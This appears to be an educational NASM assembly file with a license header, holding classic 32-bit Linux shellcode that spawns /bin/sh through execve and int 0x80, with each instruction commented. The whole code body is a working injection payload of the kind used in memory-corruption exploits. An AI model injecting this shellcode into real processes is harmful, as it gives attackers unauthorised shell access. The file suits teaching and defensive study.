;
; License
; Copyright (c) 2017 Ng Chiang Lin
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; This code is provided and to be used for educational purpose only.
; Computer misuse is a serious crime in Singapore and other
; countries, punishable by law.
;
; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
; SOFTWARE.
;
;
;This code is provided and to be used for educational purpose only.
;Computer misuse is a serious crime in Singapore and other
;countries, punishable by law. 
;
;Simple nasm shell code
;Uses the linux int 80 
;to call execve 0x0b
;
;Ng Chiang Lin 
;April 2017
;
shellcode:
    jmp start
exeshell:
    xor eax, eax             ; zero eax
    pop ebx                  ; Retrieves addr of "/bin/sh" into ebx, ebx is also first arg for execve
    mov byte [ebx + 7], al   ; Terminate string with NULL
    mov dword[ebx + 8], ebx  ; Set memory location after the "/bin/sh" to be address of /bin/sh
    mov dword[ebx + 12], eax ; Set memory location after addr of "/bin/sh" to be NULL 
    mov al,0x0b              ; Set sys call number for execve
    lea ecx, [ebx + 8]       ; Set second argument of execve to location holding addr of "/bin/sh", NULL
    lea edx, [ebx + 12]      ; Set third argument to location holding addr of NULL
    int 0x80                 ; Call int 0x80 to invoke the sys call
start:
     call exeshell           ; pushes addr of /bin/sh into stack and go to shellcode
     db  '/', 'b', 'i', 'n'  
     db  '/', 's', 'h'      
